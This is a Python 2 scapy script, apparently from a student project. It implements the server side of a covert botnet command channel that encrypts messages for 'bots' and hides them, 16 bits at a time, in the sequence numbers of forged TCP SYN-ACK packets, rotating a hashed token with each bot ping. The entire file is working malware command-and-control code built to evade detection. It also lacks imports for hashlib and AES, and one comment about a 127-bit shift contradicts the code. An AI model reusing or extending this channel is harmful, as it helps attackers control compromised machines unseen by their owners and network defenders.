from scapy.all import *


# Returns the 16 LSB of an integer
def L16(integer):
	return integer & 0xffff

# A hash that returns a 32 bit digest
def hash32(integer):
	sha1 = hashlib.sha1(format(integer, 'x'))
	return int(sha1.hexdigest(), 16) & 0xffffffff

# This function adds padding to the returned int as well to ensure its length
# in bits is a multiple of 128 (neccessary to work with AES).
def stringToInt(string):
	size = 128
	while len(string)*8 > size: # because each character in a string is 8 bits (two hex chars)
		size += 128
	paddingLen = size - len(string)*8
	return int(string.encode('hex'), 16) << paddingLen

def encryptInt(integer, key):
	key = hashlib.md5(format(key, 'x')).hexdigest().decode('hex') # so that key size is 128bit
	enc = AES.new(key, AES.MODE_ECB)
	cyphertext = enc.encrypt(format(integer, 'x').decode('hex'))
	return int(cyphertext.encode('hex'), 16)

# Returns a touple. First the 128 MSBs, afterwards the remaining integer.
def split128MSB(i):
	x = i
	shift = 0
	while x.bit_length() > 128:
		x = x >> 128
		shift += 128
	return (i >> shift), (i & (2**shift-1))
	# The reason for shifting by 127 as opposed to 128 is because
	# ASCII character encoding is up to 127 (7 bits) for each character.
	# Thus, the MSB of every 8 bit segment (and therefore every 128 bit segment)
	# will be 0. For example 'a' = 0x61 = 0b01100001.
	# All this means is that shifting by 127 takes into account the fact that the MSB
	# of the intended segment is supposed to be 0, only it was lost when converted to an int.

def get16BitBlock(i, num):
	return L16(i >> 16*(7-num))

# Our protocol. Implemented using scapy's Automata "framework". Statechart provided in docs.
class Sending(Automaton):

	def parse_args(self, message, tokList, index, ip, port, **kargs):
		Automaton.parse_args(self, **kargs)
		# the message to send to bots
		self.message = stringToInt(message)
		# server list of active tokens
		self.tokList = tokList
		# index of the token with which we are solely communicating
		self.index = index
		# to keep track of which block in the segment we sent
		self.blockNum = 0
		# segment currently being sent
		self.segment = 0
		# start ip
		self.ip = ip
		# start port
		self.port = port

	# A predefined callback. Called every time a packet is sniffed. Filters out irrelevant packets.
	def master_filter(self, pkt):
		return (IP in pkt and TCP in pkt and pkt[TCP].dport == 80
				and L16(pkt[TCP].seq) == L16(self.tokList[self.index][0]))

	def getPkt(self, ip, port):
		return (IP(dst = ip, flags = 2, id = 0)
				/TCP(sport = 80, dport = port, flags = 18,
				window = 29200, options = [("MSS", 1460)]))

	# Simply hashes the current token 7 times. So that when the bot receives
	# the completed message, it's working token will be the correct decryption key.
	def getKey(self):
		key = self.tokList[self.index][0]
		for i in range(0,7):
			key = hash32(key)
		return key

	@ATMT.state(initial = 1)
	def INIT(self):
		print 'Starting send sequence'
		ip = self.ip
		port = self.port
		del self.ip
		del self.port
		raise self.SENDING(ip, port)


	@ATMT.state()
	def SENDING(self, ip, port):
		if self.message or self.blockNum:
			token = self.tokList[self.index][0]
			if self.blockNum == 0: # we must prepare the next segment
				self.segment, self.message = split128MSB(self.message)
				key = self.getKey()
				self.segment = encryptInt(self.segment, key)
				print 'Encrypted segment with key ', key
				print 'Starting to send encrypted segment ', self.segment
			pkt = self.getPkt(ip, port)
			pkt[TCP].seq = ((token >> 16) << 16) | get16BitBlock(self.segment, self.blockNum)
			print 'Sent block', get16BitBlock(self.segment, self.blockNum), 'to', ip
			self.blockNum = (self.blockNum + 1) % 8
			send(pkt)
		else:
			print 'Finished sending message to bot at ', ip
			self.tokList[self.index][1] = 3
			# send blank response here
			raise self.TERMINATE()

	@ATMT.receive_condition(SENDING)
	def get_follow_up_ping(self, pkt):
		token = self.tokList[self.index][0]
		print 'Got follow up ping with token ', token
		self.tokList[self.index][0] = hash32(token)
		print 'Next expected token ', self.tokList[self.index][0]
		raise self.SENDING(pkt[IP].src, pkt[TCP].sport)

	@ATMT.timeout(SENDING, 40)
	def connection_ended(self):
		print 'Connection to bot ended abruptly'

	@ATMT.state(final = 1)
	def TERMINATE(self):
		pass
